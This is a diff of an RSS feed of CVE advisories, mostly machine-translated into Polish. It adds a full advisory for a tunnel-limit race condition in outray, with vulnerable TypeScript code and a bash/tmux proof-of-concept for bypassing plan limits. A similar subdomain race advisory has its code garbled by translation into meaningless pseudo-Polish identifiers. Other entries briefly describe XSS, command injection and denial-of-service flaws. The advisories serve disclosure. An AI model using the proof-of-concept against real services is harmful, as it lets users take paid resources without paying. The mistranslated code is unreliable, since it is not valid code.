@@ -1,5 +1,320 @@
 <?xml version='1.0' encoding='utf-8'?>
-<rss version="2.0"><channel><title>CVE 2026 Feed</title><link>https://cve.circl.lu</link><description>CVE z roku 2026</description><item><title>CVE-2026-0543</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-0543</link><pubDate>Tue, 13 Jan 2026 21:10:38 +0000</pubDate><description>Niewłaściwa weryfikacja danych wejściowych (CWE-20) w łączniku poczty e-mail firmy Kibana może pozwolić osobie atakującej na spowodowanie nadmiernej alokacji (CAPEC-130) poprzez specjalnie spreparowany parametr adresu e-mail.Wymaga to od osoby atakującej posiadania uwierzytelnionego dostępu z uprawnieniami na poziomie widoku wystarczającymi do wykonywania działań łącznika.Aplikacja próbuje przetworzyć specjalnie spreparowany format wiadomości e-mail, co skutkuje całkowitą niedostępnością usług dla wszystkich użytkowników do czasu ręcznego ponownego uruchomienia.
+<rss version="2.0"><channel><title>CVE 2026 Feed</title><link>https://cve.circl.lu</link><description>CVE z roku 2026</description><item><title>CVE-2026-22820</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22820</link><pubDate>Tue, 13 Jan 2026 21:53:44 +0000</pubDate><description>### Summary
+
+A TOCTOU race condition vulnerability allows a user to exceed the set number of active tunnels in their subscription plan.
+
+### Details
+
+Affected conponent: `apps/web/src/routes/api/tunnel/register.ts`
+- `/tunnel/register` endpoint code-:
+
+```ts
+// Check if tunnel already exists in database
+          const [existingTunnel] = await db
+            .select()
+            .from(tunnels)
+            .where(eq(tunnels.url, tunnelUrl));
+
+          const isReconnection = !!existingTunnel;
+
+          console.log(
+            `[TUNNEL LIMIT CHECK] Org: ${organizationId}, Tunnel: ${tunnelId}`,
+          );
+          console.log(
+            `[TUNNEL LIMIT CHECK] Is Reconnection: ${isReconnection}`,
+          );
+          console.log(
+            `[TUNNEL LIMIT CHECK] Plan: ${currentPlan}, Limit: ${tunnelLimit}`,
+          );
+
+          // Check limits only for NEW tunnels (not reconnections)
+          if (!isReconnection) {
+            // Count active tunnels from Redis SET
+            const activeCount = await redis.scard(setKey);
+            console.log(
+              `[TUNNEL LIMIT CHECK] Active count in Redis: ${activeCount}`,
+            );
+
+            // The current tunnel is NOT yet in the online_tunnels set (added after successful registration)
+            // So we check if activeCount &gt;= limit (not &gt;)
+            if (activeCount &gt;= tunnelLimit) {
+              console.log(
+                `[TUNNEL LIMIT CHECK] REJECTED - ${activeCount} &gt;= ${tunnelLimit}`,
+              );
+              return json(
+                {
+                  error: `Tunnel limit reached. The ${currentPlan} plan allows ${tunnelLimit} active tunnel${tunnelLimit &gt; 1 ? "s" : ""}.`,
+                },
+                { status: 403 },
+              );
+            }
+            console.log(
+              `[TUNNEL LIMIT CHECK] ALLOWED - ${activeCount} &lt; ${tunnelLimit}`,
+            );
+          } else {
+            console.log(`[TUNNEL LIMIT CHECK] SKIPPED - Reconnection detected`);
+          }
+
+          if (existingTunnel) {
+            // Tunnel with this URL already exists, update lastSeenAt
+            await db
+              .update(tunnels)
+              .set({ lastSeenAt: new Date() })
+              .where(eq(tunnels.id, existingTunnel.id));
+
+            return json({
+              success: true,
+              tunnelId: existingTunnel.id,
+            });
+          }
+
+          // Create new tunnel record
+          const tunnelRecord = {
+            id: randomUUID(),
+            url: tunnelUrl,
+            userId,
+            organizationId,
+            name: name || null,
+            protocol,
+            remotePort: remotePort || null,
+            lastSeenAt: new Date(),
+            createdAt: new Date(),
+            updatedAt: new Date(),
+          };
+
+          await db.insert(tunnels).values(tunnelRecord);
+
+          return json({ success: true, tunnelId: tunnelRecord.id });
+        } catch (error) {
+          console.error("Tunnel registration error:", error);
+          return json({ error: "Internal server error" }, { status: 500 });
+        }
+```
+- It checks if the tunnel exists in the database.
+```ts
+// Check if tunnel already exists in database
+          const [existingTunnel] = await db
+            .select()
+            .from(tunnels)
+            .where(eq(tunnels.url, tunnelUrl));
+
+          const isReconnection = !!existingTunnel;
+```
+
+- Limit is checked here-:
+```ts
+// Check limits only for NEW tunnels (not reconnections)
+
+if (!isReconnection) {
+
+// Count active tunnels from Redis SET
+
+const activeCount = await redis.scard(setKey);
+
+console.log(
+
+`[TUNNEL LIMIT CHECK] Active count in Redis: ${activeCount}`,
+
+);
+```
+- Redis is checked for existing tunnel to check for reconnection.
+```ts
+// Check limits only for NEW tunnels (not reconnections)
+          if (!isReconnection) {
+            // Count active tunnels from Redis SET
+            const activeCount = await redis.scard(setKey);
+            console.log(
+              `[TUNNEL LIMIT CHECK] Active count in Redis: ${activeCount}`,
+            );
+```
+
+- If the tunnel limit is exceeded, it pops up the tunnel limit error.
+
+```ts
+if (activeCount &gt;= tunnelLimit) {
+              console.log(
+                `[TUNNEL LIMIT CHECK] REJECTED - ${activeCount} &gt;= ${tunnelLimit}`,
+              );
+              return json(
+                {
+                  error: `Tunnel limit reached. The ${currentPlan} plan allows ${tunnelLimit} active tunnel${tunnelLimit &gt; 1 ? "s" : ""}.`,
+                },
+                { status: 403 },
+              );
+```
+- If the limit is not exceeded, it triggers a the `Insert` Statement without locking transactions from other request
+
+```ts
+await db.insert(tunnels).values(tunnelRecord);
+```
+- If parallel requests are made by the `wshandler` in `/outray/outray-main/apps/tunnel/src/core/WSHandler.ts` from the command line app. A request can work on a non updated  row  because the `insert` row has not been triggered allowing the user to bypass the limit. It is much explained in the proof of concept. The key takeaway is db transactions should remain locked.
+
+### PoC
+
+Using this simple bash script, the `outray` binary will be run at the same time in one `tmux` window, demonstrating the race condition and opening 4 tunnels.
+
+```bash
+#!/usr/bin/env bash
+
+# POC for Outray Tunnel Race condition
+SESSION="outray-race"
+PORTS=(8090 4000 5000 6000)
+
+# Create new detached tmux session
+tmux new-session -d -s "$SESSION" "echo '[*] outray race session started'; bash"
+
+# Split the panes and run outray
+for i in "${!PORTS[@]}"; do
+  port="${PORTS[$i]}"
+
+  if [ "$i" -ne 0 ]; then
+    tmux split-window -t "$SESSION" -h
+    tmux select-layout -t "$SESSION" tiled
+  fi
+
+  tmux send-keys -t "$SESSION" "echo '[*] Running outray on port $port'; outray $port" C-m
+done
+
+tmux set-window-option -t "$SESSION" synchronize-panes off
+
+echo "[+] tmux session '$SESSION' created"
+echo "[+] Attach with: tmux attach -t $SESSION"
+
+```
+
+Running this
+
+```
+seeker@instance-20260106-20011$ bash kay.sh
+[+] tmux session 'outray-race' created
+[+] Attach with: tmux attach -t outray-race
+
+seeker@instance-20260106-20011$ tmux attach -t outray-race
+```
+
+&lt;img width="1909" height="1021" alt="image" src="https://github.com/user-attachments/assets/c234cc94-fc25-4542-abdf-815332493a85" /&gt;
+
+
+&lt;img width="1907" height="936" alt="image" src="https://github.com/user-attachments/assets/1c302d7f-1ca6-46af-ab72-60fd01cdfded" /&gt;
+
+### Impact
+
+By exploiting this TOCTOU race condition in the affected component, the intended limit is bypassed and server resources is used with no extra billing charges on the user.</description></item><item><title>CVE-2026-22819</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22819</link><pubDate>Tue, 13 Jan 2026 21:53:30 +0000</pubDate><description>### Podsumowanie
+Ta luka umożliwia użytkownikowi, tj. użytkownikowi planu bezpłatnego, uzyskanie większej liczby subdomen niż żądana z powodu braku mechanizmów blokujących transakcje db w `https://github.com/akinloluwami/outray/blob/main/apps/web/src/routes/api/%24orgSlug/subdomains/index.ts`
+
+### Szczegóły
+- Kod, którego dotyczy problem-:
+
+```t
+//Stan wyścigu
+const [subskrypcja] = oczekuj db
+.wybierz()
+.z(subskrypcji)
+.where(eq(subskrypcje.organizationId, organizacja.id));
+
+const currentPlan = subskrypcja?.plan ||"bezpłatny";
+const planLimits = getPlanLimits(bieżącyPlan jako dowolny);
+const subdomainLimit = planLimits.maxSubdomains;
+
+const istniejąceSubdomeny = oczekuj db
+.wybierz()
+.z (subdomen)
+.where(eq(subdomeny.organizationId, organizacja.id));
+
+if (existingSubdomains.length &gt;= subdomainLimit) {
+zwróć jsona (
+{
+błąd: `Osiągnięto limit subdomeny.Plan ${currentPlan} pozwala na subdomenę ${subdomainLimit} ${subdomainLimit &gt; 1 ?"s": ""}.`,
+},
+{stan: 403 },
+);
+}
+
+const istniejący = czekaj na bazę danych
+.wybierz()
+.z (subdomen)
+.where(eq(subdomeny.subdomena, subdomena))
+.limit(1);
+
+if (istniejąca.długość &gt; 0) {
+return json({ błąd: "Subdomena już zajęta" }, { status: 409 });
+}
+
+const [newSubdomain] = czekaj na bazę danych
+.insert(subdomeny)
+.wartości({
+id: crypto.randomUUID(),
+subdomena,
+identyfikator organizacji: organizacja.id,
+userId: session.user.id,
+})
+.powrót();
+```
+
+- Pierwsza część kodu sprawdza plan użytkownika i określa jego/jej istniejące_domeny bez blokowania transakcji i zezwalania na jej uruchomienie.
+```t
+const istniejąceSubdomeny = oczekuj db
+.wybierz()
+.z (subdomen)
+.where(eq(subdomeny.organizationId, organizacja.id));
+```
+
+- Druga część kodu sprawdza, czy żądana domena przekracza limit.
+
+```t
+if (existingSubdomains.length &gt;= subdomainLimit) {
+zwróć jsona (
+{
+błąd: `Osiągnięto limit subdomeny.Plan ${currentPlan} pozwala na subdomenę ${subdomainLimit} ${subdomainLimit &gt; 1 ?"s": ""}.`,
+},
+{stan: 403 },
+);
+}
+```
+
+- Wreszcie wstawia subdomenę również po całym sprawdzeniu bez blokowania transakcji.
+
+```t
+const [newSubdomain] = czekaj na bazę danych
+.insert(subdomeny)
+.wartości({
+id: crypto.randomUUID(),
+subdomena,
+identyfikator organizacji: organizacja.id,
+userId: session.user.id,
+})
+.powrót();
+```
+- Osoba atakująca może to wykorzystać, wysyłając równoległe żądania do tego samego punktu końcowego, a jeśli drugie żądanie odczytuje wiersz „subdomeny” przed wykonaniem instrukcji „INSERT” żądania. Umożliwia to atakującemu działanie na jeszcze nie zaktualizowanym wierszu, co omija kontrolę i pozwala atakującemu uzyskać więcej subdomen. Na przykład:
+
+```
+Żądanie równoległe 1 Żądanie równoległe 2
+||
+sprawdza, czy nie jest jeszcze zaktualizowany
+dostępny wiersz subdomeny i omija kontrole logiczne
+i określa, czy jest to więcej niż limit
+||
+Wstawia subdomenę i kończy dzień. Wstawia również subdomenę
+```
+- Atak koncentruje się na wykorzystaniu okna wyścigu pomiędzy odczytem i zapisem wierszy db.
+
+### PoC
+
+- Przechwyć za pomocą serwera proxy Burp, przejdź do „Repeater” i utwórz wiele żądań w jednej partii z różnymi nazwami subdomen, jak pokazano poniżej.Na koniec wyślij żądania „równolegle”.
+
+&lt;img szerokość="1844" wysokość="855" alt="image" src="https://github.com/user-attachments/assets/f46d5993-31bd-4b96-902a-b2de5b0518bd" /&gt;
+
+- Wynik-:
+
+&lt;img szerokość="1905" wysokość="977" alt="image" src="https://github.com/user-attachments/assets/4c877de2-4b55-46f4-9f1c-78590dfebefc" /&gt;
+
+
+### Wpływ
+Luka zapewnia nieskończoną podaż domen dla użytkowników, z pominięciem konieczności subskrypcji</description></item><item><title>CVE-2026-23478</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-23478</link><pubDate>Tue, 13 Jan 2026 21:37:35 +0000</pubDate><description>Cal.com to oprogramowanie do planowania typu open source.Od wersji 3.1.6 do wersji wcześniejszej niż 6.0.7 występuje luka w niestandardowym wywołaniu zwrotnym NextAuth JWT, która umożliwia atakującym uzyskanie pełnego uwierzytelnionego dostępu do konta dowolnego użytkownika poprzez podanie docelowego adresu e-mail za pomocą session.update().Luka ta została naprawiona w wersji 6.0.7.</description></item><item><title>CVE-2025-68658</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-68658</link><pubDate>Tue, 13 Jan 2026 21:25:57 +0000</pubDate><description>Open Source Point of Sale (opensourcepos) to internetowa aplikacja dla punktów sprzedaży napisana w PHP przy użyciu frameworka CodeIgniter.opensourcepos 3.4.0 i 3.4.1 ma zapisaną lukę w zabezpieczeniach XSS w funkcjonalności konfiguracji (informacji).Uwierzytelniony użytkownik z uprawnieniem „Konfiguracja: Zmień konfigurację OSPOS” może wstrzyknąć złośliwy ładunek JavaScript do pola Nazwa firmy podczas aktualizowania informacji w konfiguracji.Szkodliwy ładunek jest przechowywany i później uruchamiany, gdy użytkownik uzyska dostęp do pliku /sales/complete.Najpierw wybierz opcję Sprzedaż, a następnie opcję Nowy element, aby utworzyć przedmiot, a następnie kliknij opcję Zakończono.Z powodu niewystarczającej weryfikacji danych wejściowych i kodowania wyjściowego ładunek jest renderowany i wykonywany w przeglądarce użytkownika, co powoduje zapisanie luki w zabezpieczeniach XSS.Ta luka została naprawiona w wersji 3.4.2.
+
+CVSS Score: 4.3 (medium)</description></item><item><title>CVE-2025-68947</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-68947</link><pubDate>Tue, 13 Jan 2026 21:19:55 +0000</pubDate><description>NSecsoft „NSecKrnl” to sterownik systemu Windows, który umożliwia lokalnemu, uwierzytelnionemu atakującemu zakończenie procesów będących własnością innych użytkowników, w tym procesów SYSTEMOWYCH i procesów chronionych, poprzez wysłanie spreparowanych żądań IOCTL do sterownika.
+
+CVSS Score: 4.7 (medium)</description></item><item><title>CVE-2026-0543</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-0543</link><pubDate>Tue, 13 Jan 2026 21:10:38 +0000</pubDate><description>Niewłaściwa weryfikacja danych wejściowych (CWE-20) w łączniku poczty e-mail firmy Kibana może pozwolić osobie atakującej na spowodowanie nadmiernej alokacji (CAPEC-130) poprzez specjalnie spreparowany parametr adresu e-mail.Wymaga to od osoby atakującej posiadania uwierzytelnionego dostępu z uprawnieniami na poziomie widoku wystarczającymi do wykonywania działań łącznika.Aplikacja próbuje przetworzyć specjalnie spreparowany format wiadomości e-mail, co skutkuje całkowitą niedostępnością usług dla wszystkich użytkowników do czasu ręcznego ponownego uruchomienia.
 
 CVSS Score: 6.5 (medium)</description></item><item><title>CVE-2026-0531</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-0531</link><pubDate>Tue, 13 Jan 2026 21:05:51 +0000</pubDate><description>Alokacja zasobów bez ograniczeń i dławienia (CWE-770) we flocie Kibana może prowadzić do nadmiernej alokacji (CAPEC-130) poprzez specjalnie spreparowane żądanie pobrania zbiorczego.Wymaga to od osoby atakującej posiadania uprawnień niskiego poziomu odpowiadających roli przeglądającego, która zapewnia dostęp do odczytu zasad agenta.Stworzone żądanie może spowodować, że aplikacja wykona nadmiarowe operacje pobierania bazy danych, które natychmiastowo zużyją pamięć do czasu awarii serwera i stanu niedostępnego dla wszystkich użytkowników.
 
@@ -1023,7 +1338,7 @@ zwracanie -EINVAL w przypadku przekroczenia limitu.
 
 v2: użyj XE_IOCTL_DBG() i usuń zduplikowane sprawdzenie.(Aszutosz)
 
-(wiśnia wybrana z zatwierdzenia e057b2d2b8d815df3858a87dffafa2af37e5945b)</description></item><item><title>CVE-2025-13447</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-13447</link><pubDate>Tue, 13 Jan 2026 14:31:56 +0000</pubDate><description>Wstrzykiwanie poleceń systemu operacyjnego Luka w zabezpieczeniach API umożliwiająca zdalne wykonanie kodu w toku LoadMaster umożliwia uwierzytelnionej osobie atakującej z uprawnieniami „Administracja użytkownikami” wykonywanie dowolnych poleceń na urządzeniu LoadMaster poprzez wykorzystanie niezatwierdzonych danych wejściowych w parametrach wejściowych API
+(wiśnia wybrana z zatwierdzenia e057b2d2b8d815df3858a87dffafa2af37e5945b)</description></item><item><title>CVE-2026-22755</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22755</link><pubDate>Tue, 13 Jan 2026 15:12:53 +0000</pubDate><description>Niewłaściwa neutralizacja elementów specjalnych używanych w luce w zabezpieczeniach polecenia („wstrzykiwanie poleceń”) w Vivotek Numery modeli urządzeń, których dotyczy problem, to FD8365, FD8365v2, FD9165, FD9171, FD9187, FD9189, FD9365, FD9371, FD9381, FD9387,FD9389, FD9391, FE9180, FE9181, FE9191, FE9381, FE9382, FE9391, FE9582, IB9365, IB93587LPR, IB9371,IB9381, IB9387, IB9389,IB939, IP9165, IP9171, IP9172, IP9181, IP9191, IT9389, MA9321, MA9322, MS9321, MS9390, TB9330 (moduły oprogramowania układowego) umożliwiają wstrzykiwanie poleceń systemu operacyjnego. Ten problem dotyczy Numery modeli urządzeń, których dotyczy problem, to FD8365, FD8365v2,FD9165, FD9171, FD9187, FD9189, FD9365, FD9371, FD9381, FD9387, FD9389, FD9391,FE9180,FE9181, FE9191, FE9381, FE9382, FE9391, FE9582,IB9365, IB93587LPR, IB9371,IB9381, IB9387, IB9389, IB939,IP9165,IP9171, IP9172, IP9181, IP9191, IT9389, MA9321, MA9322, MS9321, MS9390, TB9330:0100a, 0106a, 0106b, 0107a, 0107b_1, 0109a, 0112a, 0113a, 0113d, 0117b, 0119e, 0120b, 0121, 0121d, 0121d_48573_1,0122e, 0124d_48573_1, 012501, 012502, 0125c.</description></item><item><title>CVE-2025-13447</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-13447</link><pubDate>Tue, 13 Jan 2026 14:31:56 +0000</pubDate><description>Wstrzykiwanie poleceń systemu operacyjnego Luka w zabezpieczeniach API umożliwiająca zdalne wykonanie kodu w toku LoadMaster umożliwia uwierzytelnionej osobie atakującej z uprawnieniami „Administracja użytkownikami” wykonywanie dowolnych poleceń na urządzeniu LoadMaster poprzez wykorzystanie niezatwierdzonych danych wejściowych w parametrach wejściowych API
 
 CVSS Score: 8.4 (high)</description></item><item><title>CVE-2025-13444</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-13444</link><pubDate>Tue, 13 Jan 2026 14:26:50 +0000</pubDate><description>Wstrzykiwanie poleceń systemu operacyjnego Luka w zabezpieczeniach API umożliwiająca zdalne wykonanie kodu w toku LoadMaster umożliwia uwierzytelnionej osobie atakującej z uprawnieniami „Administracja użytkownikami” wykonywanie dowolnych poleceń na urządzeniu LoadMaster poprzez wykorzystanie niezatwierdzonych danych wejściowych w parametrach wejściowych API
 
